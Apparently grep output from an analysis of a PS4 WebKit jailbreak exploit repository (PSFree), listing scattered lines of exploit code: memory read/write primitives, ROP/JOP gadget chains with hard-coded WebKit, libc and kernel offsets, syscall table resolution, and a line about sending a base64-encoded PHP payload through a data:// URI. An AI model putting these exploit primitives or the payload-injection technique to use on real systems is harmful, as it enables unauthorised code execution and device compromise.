+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:657:    write64(view, offset_target_addr, jsview[2]);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:658:    debug_log(`0x${num_loop_str}: ${read32(view, offset_num_loop)}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/exploitold.mjs:659:    debug_log(`0x${target_addr_str}: ${read64(view, offset_target_addr)}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/goldhen.mjs:39:	var arr_str = Object.getOwnPropertyNames(g_obj_str);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/goldhen.mjs:82:		Object.defineProperties({}, props);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/goldhen.mjs:110:				props = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/jbcheck.mjs:31:data:// to provide a file inline which includes the base64 encoded PHP payload.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/jbcheck.mjs:282:        send_php_exploit('/dev/fd/0', payload.encoded)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:27:import * as o from './offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:30:export const syscall_map = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:95:    get_gadget(insn_str) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:96:        const addr = this.gadgets.get(insn_str);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:98:            throw Error(`gadget not found: ${insn_str}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:104:    push_gadget(insn_str) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:105:        this.push_value(this.get_gadget(insn_str));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:117:            this.push_gadget(argument_pops[i]);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:124:        // pushed a "ret" gadget for a noop.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:126:            this.push_gadget('ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:132:    push_syscall(syscall_name, ...args) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:133:        if (typeof syscall_name !== 'string') {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:134:            throw TypeError(`syscall_name not a string: ${syscall_name}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:137:        const sysno = syscall_map.get(syscall_name);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:139:            throw Error(`syscall_name not found: ${syscall_name}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:142:        const syscall_addr = this.syscall_array[sysno];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:143:        if (syscall_addr === undefined) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:144:            throw Error(`syscall number not in syscall_array: ${sysno}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:147:        this.push_call(syscall_addr, ...args);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:167:    // Sets needed class properties
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:170:    //   gadgets:
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:173:    //   syscall_array:
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:174:    //     An array whose indices correspond to syscall numbers. Maps syscall
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:179:    //     For missing bare minimum gadgets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:180:    static init_class(gadgets, syscall_array=[]) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:182:            if (!gadgets.has(insn)) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:183:                throw Error(`gadget map must contain this gadget: ${insn}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:186:        this.prototype.gadgets = gadgets;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/chain.mjs:187:        this.prototype.syscall_array = syscall_array;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:27:import * as o from './offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:36:    read8(offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:37:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:41:    read16(offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:42:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:46:    read32(offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:47:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:51:    read64(offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:52:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:57:    readp(offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:58:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:62:    write8(offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:63:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:68:    write16(offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:69:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:74:    write32(offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:75:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:80:    write64(offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:81:        const addr = this.add(offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:127:    // The constraint is 0 <= offset + 1 < 2**32.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:137:    write0(size, offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:138:        const i = offset + 1;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:140:            throw RangeError(`read0() invalid offset: ${offset}`);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:217:        // The initial creation of the "a" property will change the butterfly
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/mem.mjs:219:        worker.a = 0; // dummy value, we just want to create the "a" property
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:27:import * as o from './offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:32:    // at webkitgtk 2.34.4
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:67:    // byte sequence that is very likely to appear at offset 0 of a .text
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:114:// let module_base_addr = find_base(...);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:119:export function find_base(addr, is_text, is_back) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:124:    const offset = (is_back ? -1 : 1) * page_size;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:129:        addr = addr.add(offset)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:142:export function resolve_import(import_addr) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:154:    const offset = new Int(disp, disp >> 31);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:159:    const function_addr = import_addr.add(offset.add(6)).readp(0);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:164:export function init_syscall_array(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:165:    syscall_array,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:166:    libkernel_web_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:176:    const libkernel_web_buffer = make_buffer(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:177:        libkernel_web_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:180:    const kbuf = new Uint8Array(libkernel_web_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:182:    // Search 'rdlo' string from libkernel_web's .rodata section to gain an
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:199:            '"rdlo" string not found in libkernel_web, base address:'
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:200:            + ` ${libkernel_web_base}`
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:205:    // syscall_X:
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:208:    //     syscall
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:219:            const syscall_num = read32(kbuf, i + 3);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/memtools.mjs:220:            syscall_array[syscall_num] = libkernel_web_base.add(i);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/offset.mjs:18:// offsets for JSC::JSObject
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/offset.mjs:21:// offsets for JSC::JSArrayBufferView
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/offset.mjs:29:// offsets for WTF::StringImpl
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:26:// function read32(u8_view, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:27://     let res = new Uint32Array(u8_view.buffer, offset, 1);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:33:// function read32(u8_view, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:36://         res += u8_view[offset + i] << i*8;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:43:function read(u8_view, offset, size) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:46:        res += u8_view[offset + i] << i*8;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:52:export function read16(u8_view, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:53:    return read(u8_view, offset, 2);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:56:export function read32(u8_view, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:57:    return read(u8_view, offset, 4);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:60:export function read64(u8_view, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:63:        res.push(u8_view[offset + i]);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:69:function write(u8_view, offset, value, size) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:71:        u8_view[offset + i]  = (value >>> i*8) & 0xff;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:75:export function write16(u8_view, offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:76:    write(u8_view, offset, value, 2);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:79:export function write32(u8_view, offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:80:    write(u8_view, offset, value, 4);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:83:export function write64(u8_view, offset, value) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:92:        u8_view[offset + i]  = (low >>> i*8) & 0xff;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:95:        u8_view[offset + 4 + i]  = (high >>> i*8) & 0xff;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:99:export function sread64(str, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/rw.mjs:102:        res.push(str.charCodeAt(offset + i));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/utils.mjs:37:export function str2array(str, length, offset) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/utils.mjs:38:    if (offset === undefined) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/utils.mjs:39:        offset = 0;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/module/utils.mjs:43:        a[i] = str.charCodeAt(i + offset);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:2:define kernel_offset_xfast_syscall 0x1c0
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:3:define kernel_offset_allproc 0x1b946e0
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:4:define kernel_offset_vmspace_acquire_ref 0x7b9e0
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:5:define kernel_offset_vmspace_free 0x7b810
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:6:define kernel_offset_printf 0xb7a30
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:7:define kernel_offset_kmem_alloc 0x37be70
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:8:define kernel_offset_kernel_map 0x2268d48
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:9:define kernel_offset_sysent 0x1100310
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:10:define kernel_offset_proc_rwmem 0x41eb00
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/reg.mjs:11:define kernel_offset_copyin 0x2716a0
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:28:    find_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:30:    resolve_import,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:31:    init_syscall_array,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:35:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:41:const syscall_array = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:43:const offset_func_exec = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:44:const offset_textarea_impl = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:45:const offset_js_inline_prop = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:47:// WebKit offsets of imported functions
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:48:const offset_wk_stack_chk_fail = 0x8d8;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:49:const offset_wk_strlen = 0x918;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:51:// libSceLibcInternal offsets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:52:const offset_libc_setjmp = 0x258f4;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:53:const offset_libc_longjmp = 0x29c58;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:69:let libwebkit_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:70:// libkernel_web.sprx
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:71:let libkernel_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:75:const kjop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:80:const k2jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:85:// gadgets for the JOP chain
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:87:// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:88:// because jop1-5 was the original chain used by the old implementation of
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:89:// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:93:const ta_jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:101:// ta_jop1 pushed another object (via the call instruction) but we want no
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:103:// jop2 later. So we pop the return address pushed by ta_jop1.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:106:const ta_jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:110:const ta_jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:115:// jop1 was previously used by the old implementation of Chain803, now unused
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:116:const jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:123:const jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:129:const jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:134:const jop4 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:139:const jop5 = 'pop rsp; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:153:const rop_epilogue = 'leave; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:155:const webkit_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:200:    [kjop1] : 0x00000000010da705,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:201:    [k2jop1] : 0x0000000001988320,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:203:    [jop1] : 0x000000000028a8d0,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:204:    [jop2] : 0x000000000076b970,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:205:    [jop3] : 0x0000000000202698,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:206:    [jop4] : 0x00000000021af6ad,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:208:    [ta_jop1] : 0x00000000005efb14,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:209:    [ta_jop2] : 0x0000000002198221,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:210:    [ta_jop3] : 0x00000000014ff7a2,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:213:const libc_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:217:    'setjmp' : offset_libc_setjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:218:    'longjmp' : offset_libc_longjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:221:const gadgets = new Map();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:225:    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:227:    const libwebkit_base = find_base(textarea_vtable, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:230:        libwebkit_base
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:231:        .add(offset_wk_stack_chk_fail)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:233:    const stack_chk_fail_addr = resolve_import(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:238:    const libkernel_base = find_base(stack_chk_fail_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:240:    const strlen_import = libwebkit_base.add(offset_wk_strlen);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:241:    const strlen_addr = resolve_import(strlen_import, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:242:    const libc_base = find_base(strlen_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:245:        libwebkit_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:246:        libkernel_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:251:function init_gadget_map(gadget_map, offset_map, base_addr) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:252:    for (const [insn, offset] of offset_map) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:253:        gadget_map.set(insn, base_addr.add(offset));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:266:        rw.write64(this.jmp_target, 0x50, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:267:        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:277:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:279:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:281:        this.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:286:        this.push_gadget(rop_epilogue);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:322:    //     chain.push_gadget('mov rax, 0; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:324:    //     chain.push_gadget('pop rbx; ret'); // always executed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:335:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:337:        this.push_gadget('neg rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:338:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:340:        this.push_gadget('adc esi, esi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:341:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:343:        this.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:351:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:353:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:356:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:360:        this.push_gadget('neg rax; and rax, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:361:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:363:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:373:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:377:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:384:        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:385:        this.push_gadget('mov rdx, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:390:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:392:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:398:        this.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:403:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:405:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:410:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:412:        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:417:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:419:        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:441:        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop.mjs:452:        this.push_gadget('pop rax; ret');
